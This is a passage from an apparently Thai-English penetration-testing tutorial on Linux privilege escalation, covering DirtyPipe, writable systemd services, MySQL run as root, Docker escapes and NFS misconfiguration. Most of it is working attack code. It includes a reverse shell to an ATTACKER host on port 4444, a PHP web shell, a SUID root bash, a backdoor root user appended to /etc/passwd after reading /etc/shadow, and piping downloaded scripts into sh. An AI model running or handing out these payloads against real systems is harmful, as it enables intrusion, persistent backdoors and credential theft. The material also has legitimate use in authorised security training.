            # Drain pipe to reset offset but keep flags
            for _ in range(drain_count):
                os.read(pipe_r, PAGE_SIZE)
            
            # Write one byte to set PIPE_BUF_FLAG_CAN_MERGE
            os.write(pipe_w, b'A')
            os.read(pipe_r, 1)
            
            # Open target file
            fd = os.open(target_file, os.O_RDONLY)
            
            # Splice from file to pipe at specific offset
            # This creates a reference to the page cache
            import ctypes
            libc = ctypes.CDLL('libc.so.6', use_errno=True)
            libc.splice(fd, ctypes.c_long(offset), pipe_w, None, 1, 0)
            
            # Write payload to pipe - due to PIPE_BUF_FLAG_CAN_MERGE,
            # it overwrites the page cache directly!
            os.write(pipe_w, payload)
            
            os.close(fd)
            print(f"[DirtyPipe] Successfully wrote {len(payload)} bytes!")
            return True
            
        except Exception as e:
            print(f"[DirtyPipe] Failed: {e}")
            return False
        finally:
            os.close(pipe_r)
            os.close(pipe_w)
    
    def make_setuid_shell(self) -> bool:
        """Create SUID bash copy using DirtyPipe"""
        # Overwrite SUID bit in /etc/passwd or copy bash
        print("Use DirtyPipe to:")
        print("1. Overwrite /etc/passwd to add root user")
        print("2. Overwrite a SUID binary's first bytes to redirect to backdoor")
        print("3. Overwrite a root-owned script that runs as cron")
        return True
```

---

## Step 408: Service และ Process Exploitation

```python
import subprocess
import os
import re
from typing import List, Dict

class ServicePrivEsc:
    """ใช้ services และ processes เพื่อ PrivEsc"""
    
    def find_writable_service_files(self) -> List[str]:
        """ค้นหา service files ที่เขียนได้"""
        writable = []
        
        service_paths = [
            '/etc/systemd/system',
            '/lib/systemd/system',
            '/usr/lib/systemd/system',
            '/etc/init.d',
            '/etc/init',
        ]
        
        for path in service_paths:
            try:
                for root, dirs, files in os.walk(path):
                    for file in files:
                        filepath = os.path.join(root, file)
                        if os.access(filepath, os.W_OK):
                            writable.append(filepath)
                            print(f"[!] Writable service file: {filepath}")
            except Exception:
                pass
        
        return writable
    
    def exploit_writable_service(self, service_file: str) -> str:
        """Exploit writable systemd service file"""
        return f"""
# Writable service file: {service_file}

# Read current service file
cat {service_file}

# Modify ExecStart to run our payload
# Find ExecStart line and replace:
sed -i 's|ExecStart=.*|ExecStart=/bin/bash -c "bash -i >\\& /dev/tcp/ATTACKER/4444 0>\\&1"|' {service_file}

# Or add our payload to ExecStartPre:
sed -i '/\[Service\]/a ExecStartPre=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"' {service_file}

# Reload and restart service
systemctl daemon-reload
systemctl restart $(basename {service_file} .service)

# Or wait for next restart/reboot
"""
    
    def find_root_process_vulnerabilities(self) -> List[Dict]:
        """ค้นหา root processes ที่อาจ exploit ได้"""
        findings = []
        
        try:
            result = subprocess.run(
                ['ps', 'aux'],
                capture_output=True, text=True
            )
            
            for line in result.stdout.split('\n'):
                if line.startswith('root'):
                    parts = line.split()
                    if len(parts) < 11:
                        continue
                    
                    pid = parts[1]
                    cmd = ' '.join(parts[10:])
                    
                    # Check for known vulnerable services
                    if any(svc in cmd.lower() for svc in [
                        'mysql', 'postgres', 'mongodb',
                        'redis', 'memcached', 'elasticsearch'
                    ]):
                        findings.append({
                            'pid': pid,
                            'command': cmd,
                            'finding': 'Database service running as root'
                        })
                    
                    # Check for scripts running as root
                    if '.py' in cmd or '.sh' in cmd or '.pl' in cmd:
                        # Check if script is writable
                        script_match = re.search(r'(/[\w/.-]+\.(?:py|sh|pl|rb))', cmd)
                        if script_match:
                            script_path = script_match.group(1)
                            if os.path.exists(script_path) and os.access(script_path, os.W_OK):
                                findings.append({
                                    'pid': pid,
                                    'command': cmd,
                                    'finding': f'WRITABLE script running as root: {script_path}'
                                })
        except Exception as e:
            print(f"Error: {e}")
        
        return findings
    
    def exploit_mysql_as_root(self) -> str:
        """Exploit MySQL running as root (old installs)"""
        return """
# If MySQL is running as root and we have MySQL credentials:

# Method 1: User-Defined Function (UDF)
mysql -u root -p << 'EOF'
CREATE TABLE foo(line blob);
INSERT INTO foo VALUES(load_file('/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys.so'));
SELECT * FROM foo INTO dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');
EOF

/tmp/rootbash -p

# Method 2: Write SSH key
mysql -u root -p << 'EOF'
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
EOF
"""
```

---

## Step 409: Docker และ Container Escapes

```bash
#!/bin/bash
# Docker/Container Escape Techniques

echo "=== Container Escape Check ==="

# Check if we're in a container
check_container() {
    # Check for .dockerenv
    [ -f /.dockerenv ] && echo "In Docker container"
    
    # Check cgroup
    grep -q docker /proc/1/cgroup 2>/dev/null && echo "Docker cgroup detected"
    
    # Check for container-specific processes
    ls -la /proc/1/exe 2>/dev/null
    
    # Check capabilities
    cat /proc/self/status | grep CapEff
    capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}')
}

check_container

# Method 1: Privileged container escape
# If running in --privileged mode:
check_privileged() {
    # Check if we can mount devices
    mount -l 2>/dev/null | grep -q 'type cgroup' && \
    cat /proc/self/status | grep CapEff | grep -qE '^Cap[A-Z]+:\s+[0-9a-f]*[fF][0-9a-f]*[fF]' && \
    echo "Possibly privileged container!"
    
    # Direct check
    ls /dev/ | grep -q 'sda\|vda\|nvme' && echo "Disk devices visible - possibly privileged!"
}

check_privileged

# Exploit privileged container
exploit_privileged() {
    echo "[*] Attempting privileged escape..."
    
    # Find root device
    ROOT_DEVICE=$(cat /proc/mounts | grep ' / ' | awk '{print $1}')
    echo "Root device: $ROOT_DEVICE"
    
    # Mount host filesystem
    mkdir -p /tmp/host
    mount $ROOT_DEVICE /tmp/host
    
    if [ $? -eq 0 ]; then
        echo "[!] Mounted host filesystem at /tmp/host!"
        ls -la /tmp/host/
        cat /tmp/host/etc/shadow
        
        # Add root user to host
        echo "hacker:$(openssl passwd -6 'hacked123'):0:0:root:/root:/bin/bash" >> \
            /tmp/host/etc/passwd
        echo "[!] Added backdoor user to host!"
    fi
}

# Method 2: Docker socket escape
# If /var/run/docker.sock is accessible:
if [ -S /var/run/docker.sock ]; then
    echo "[!] Docker socket accessible! Can escape to host!"
    
    # Run privileged container mounting host filesystem
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
    
    # Or using curl via Docker API
    curl --unix-socket /var/run/docker.sock \
        'http://localhost/containers/json' 2>/dev/null | python3 -m json.tool | head -30
    
    # Create container with full host access
    curl --unix-socket /var/run/docker.sock \
        -H 'Content-Type: application/json' \
        -d '{"Image":"ubuntu","Cmd":["/bin/bash"],"Binds":["/:/hostfs"],"Privileged":true}' \
        'http://localhost/containers/create?name=escape' 2>/dev/null
fi

# Method 3: Namespace escape (CAP_SYS_ADMIN)
if capsh --print 2>/dev/null | grep -q 'cap_sys_admin'; then
    echo "[!] CAP_SYS_ADMIN available - can escape namespace!"
    
    # Mount proc to see host processes
    mount -t proc proc /tmp/proc
    ls /tmp/proc/
    
    # nsenter to host PID namespace
    nsenter -t 1 -m -u -i -n -p -- /bin/bash
fi
```

---

## Step 410: NFS Misconfiguration และ Automated PrivEsc

```bash
#!/bin/bash
# NFS Misconfiguration and Automated PrivEsc

# =================================
# NFS no_root_squash Exploitation
# =================================

echo "=== NFS PrivEsc ==="

# Check NFS shares on target
cat /etc/exports 2>/dev/null
showmount -e localhost 2>/dev/null

# From attacker machine:
# showmount -e TARGET
# Look for shares with no_root_squash

# If share has no_root_squash, root on attacker = root on share:
mount_and_exploit() {
    TARGET="$1"
    SHARE="$2"
    
    mkdir -p /tmp/nfs_mount
    mount -t nfs $TARGET:$SHARE /tmp/nfs_mount -o nolock
    
    if [ $? -eq 0 ]; then
        echo "Mounted NFS share"
        # Copy bash and make SUID
        cp /bin/bash /tmp/nfs_mount/rootbash
        chmod +s /tmp/nfs_mount/rootbash
        echo "[!] SUID bash created on target NFS share!"
        echo "On target: /tmp/nfs_mount/rootbash -p"
        umount /tmp/nfs_mount
    fi
}

# =================================
# LinPEAS/LinEnum Automation
# =================================

echo "=== Automated PrivEsc Tools ==="

# Download and run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh 2>/dev/null
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh -a 2>/dev/null | tee /tmp/linpeas_output.txt

# Alternatively, run from memory
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh 2>/dev/null | sh

# LSE (Linux Smart Enumeration)
curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -o /tmp/lse.sh 2>/dev/null
chmod +x /tmp/lse.sh
/tmp/lse.sh -l2 -i | tee /tmp/lse_output.txt

# PSPY - monitor processes without root
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O /tmp/pspy64 2>/dev/null
chmod +x /tmp/pspy64
/tmp/pspy64 -pf -i 1000  # Monitor processes and file system events

# exploit-suggester
uname -r
cat /proc/version
# Upload output to exploit-suggester.sh or web tool

# LES (Linux Exploit Suggester)
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O /tmp/les.sh 2>/dev/null
bash /tmp/les.sh

# =================================
# PrivEsc Checklist Summary
# =================================

cat << 'EOF'
=== Linux PrivEsc Checklist ===

[SYSTEM]
□ Kernel version (check for CVEs)
□ OS version and patch level
□ Architecture (x86/x64/ARM)

[USERS]
□ Current user and groups
□ sudo -l (nopasswd entries)
□ /etc/sudoers content
□ /etc/passwd and /etc/shadow readability
□ Users with UID=0

[SUID/SGID]
□ SUID binaries list (GTFOBins check)
□ SGID binaries list
□ Writable SUID binaries

[CAPABILITIES]
□ getcap -r / 2>/dev/null
□ cap_setuid, cap_sys_admin, cap_dac_override

[CRON]
□ /etc/crontab and /etc/cron.d/*
□ User crontabs
□ Writable scripts called by root cron
□ PATH in crontab
□ Wildcard injection possibilities

[FILES]
□ Writable /etc/passwd, /etc/sudoers
□ Writable service files
□ World-writable /etc/environment
□ .bashrc/.profile writable

[SERVICES]
□ Services running as root
□ Writable service configurations
□ NFS exports (no_root_squash)
□ Docker socket accessible
□ Container with privileged flag

[CREDENTIALS]
□ Config files with passwords
□ SSH keys in home directories
□ History files (.bash_history)
□ Environment variables
□ /proc/<pid>/environ
EOF
```

---

## สรุป Part 41

- **Step 401**: Linux PrivEsc Enumeration - comprehensive system/user/SUID/cron/network scan
- **Step 402**: SUID/SGID Exploitation - GTFOBins reference, Python/find/awk exploits
- **Step 403**: Sudo Misconfigurations - CVE-2021-3156, CVE-2019-14287, LD_PRELOAD via sudo
- **Step 404**: Linux Capabilities - cap_setuid/cap_dac_read/cap_sys_ptrace exploitation
- **Step 405**: Cron Job Exploitation - writable scripts, wildcard injection, PATH in crontab
- **Step 406**: PATH Injection และ Library Hijacking - LD_PRELOAD, LD_LIBRARY_PATH, Python hijack
- **Step 407**: Kernel Exploits - DirtyCOW, DirtyPipe, PwnKit CVE reference
- **Step 408**: Service และ Process Exploitation - writable service files, MySQL root exploitation
- **Step 409**: Docker Container Escapes - privileged container, docker.sock, namespace escape
- **Step 410**: NFS Misconfiguration และ Automated Tools - LinPEAS, LSE, pspy, LES
